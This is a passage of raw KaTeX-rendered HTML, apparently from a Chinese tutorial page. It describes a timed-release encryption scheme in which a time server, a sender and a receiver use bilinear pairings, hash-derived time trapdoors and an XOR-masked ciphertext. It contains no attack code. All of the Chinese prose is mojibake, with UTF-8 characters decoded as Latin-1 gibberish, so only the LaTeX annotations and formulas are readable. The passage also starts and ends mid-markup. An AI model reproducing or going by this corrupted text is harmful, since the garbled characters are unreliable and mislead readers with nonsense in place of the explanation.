class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œå¹¶ä¸”è®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>â‹…</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">s\cdot P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4445em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>ä½œä¸ºå…¶å…¬é’¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><msub><mi>s</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub></mrow><annotation encoding="application/x-tex">ts_{pub}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9012em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></p></li><li><p>ç±»ä¼¼çš„ï¼Œæ¥æ”¶æ–¹é€‰å–éšæœºæ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mo>âˆˆ</mo><msubsup><mi>Z</mi><mi>q</mi><mo>âˆ—</mo></msubsup></mrow><annotation encoding="application/x-tex">u\in Z_q^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">u</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0718em;vertical-align:-0.3831em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-2.453em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3831em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œä½œä¸ºå…¶ç§é’¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mi>s</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">usk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>ï¼Œä»¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mi>P</mi></mrow><annotation encoding="application/x-tex">uP</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>ä½œä¸ºå…¶å…¬é’¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mi>p</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">upk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></p></li><li><p>ç»™å®šæ¶ˆæ¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>ã€æ¥æ”¶æ–¹å…¬é’¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mi>p</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">upk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>ã€æ—¶é—´æœåŠ¡å™¨å…¬é’¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><msub><mi>s</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub></mrow><annotation encoding="application/x-tex">ts_{pub}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9012em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>ä»¥åŠå‘å¸ƒæ—¶é—´<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>âˆˆ</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mo>âˆ—</mo></msup></mrow><annotation encoding="application/x-tex">T\in \{0,1\}^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span></span></span></span>ï¼Œå‘é€æ–¹è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><p>(1)éšæœºé€‰å–æ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mo>âˆˆ</mo><msubsup><mi>Z</mi><mi>q</mi><mo>âˆ—</mo></msubsup></mrow><annotation encoding="application/x-tex">r\in Z_q^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0718em;vertical-align:-0.3831em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-2.453em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3831em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œè®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>=</mo><mi>r</mi><mo>âˆ—</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">U=r*P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></p><p>(2)è®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo>=</mo><mi>e</mi><mo stretchy="false">(</mo><mi>r</mi><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>u</mi><mi>P</mi><mo>+</mo><mi>s</mi><mi>P</mi><mo stretchy="false">)</mo><mo>=</mo><mi>e</mi><mo stretchy="false">(</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>P</mi><msup><mo stretchy="false">)</mo><mrow><mi>r</mi><mo stretchy="false">(</mo><mi>u</mi><mo>+</mo><mi>s</mi><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">K=e(rH_1(T),uP+sP)=e(H_1(T),P)^{r(u+s)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">u</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">s</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></p><p>(3)å¾—åˆ°å¯†æ–‡<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><mo>&lt;</mo><mi>U</mi><mo separator="true">,</mo><mi>V</mi><mo>&gt;</mo><mo>=</mo><mo>&lt;</mo><mi>r</mi><mi>P</mi><mo separator="true">,</mo><mi>M</mi><mo>âŠ•</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">C=&lt;U,V&gt;=&lt;rP,M\oplus H_2(K)&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;=&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span></span></span></span></p></li><li><p>åœ¨æŒ‡å®šè§£å¯†æ—¶é—´<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>âˆˆ</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mo>âˆ—</mo></msup></mrow><annotation encoding="application/x-tex">T\in\{0,1\}^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span></span></span></span>ï¼Œæ—¶é—´æœåŠ¡å™¨ä½¿ç”¨ç§é’¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><msub><mi>s</mi><mrow><mi>p</mi><mi>r</mi><mi>i</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">ts_{priv}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9012em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œè®¡ç®—æ—¶é—´é™·é—¨<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>T</mi></msub><mo>=</mo><mi>t</mi><msub><mi>s</mi><mrow><mi>p</mi><mi>r</mi><mi>i</mi><mi>v</mi></mrow></msub><mo>â‹…</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>=</mo><mi>s</mi><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S_T=ts_{priv}\cdot H_1(T)=sH_1(T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9012em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span></p></li><li><p>åœ¨æŒ‡å®šè§£å¯†æ—¶é—´<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>âˆˆ</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mo>âˆ—</mo></msup></mrow><annotation encoding="application/x-tex">T\in\{0,1\}^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span></span></span></span>ï¼Œæ¥æ”¶æ–¹ä½¿ç”¨ç§é’¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mi>s</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">usk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>è®¡ç®—è‡ªå·±çš„æ—¶é—´é™·é—¨<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>U</mi><mi>T</mi></msub><mo>=</mo><mi>u</mi><mi>s</mi><mi>k</mi><mo>â‹…</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>=</mo><mi>u</mi><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">U_T=usk\cdot H_1(T)=uH_1(T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span></p></li><li><p>ç»™å®šå¯†æ–‡<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><mo>&lt;</mo><mi>U</mi><mo separator="true">,</mo><mi>V</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">C=&lt;U,V&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span></span></span></span>ï¼Œæ¥æ”¶æ–¹åœ¨æŒ‡å®šè§£å¯†æ—¶é—´<span class="katex"><span class="katex-mathml"><math 